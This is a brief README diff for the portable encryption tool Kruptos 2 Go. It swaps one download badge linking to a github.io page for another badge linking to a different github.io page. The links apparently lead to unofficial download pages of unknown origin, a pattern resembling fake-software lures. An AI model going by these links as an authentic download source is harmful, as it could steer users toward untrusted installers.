@@ -1,10 +1,7 @@
 # Kruptos 2 Go – Portable USB Encryption
 
-## 📥 Kruptos 2 Go
+[![Explore Kruptos 2 Go](https://img.shields.io/badge/Explore-Kruptos%202%20Go-0E7490?style=plastic)](https://kruptos-2-go-today.github.io/.github/)
 
-[![⬇️Kruptos 2 Go](https://img.shields.io/badge/Download-Kruptos%202%20Go-blue?style=for-the-badge&logo=usb)](https://angelaaguilarang.github.io/.github/kruptos-2-go-portable)
-
----
 
 ## 📦 How to Install
 
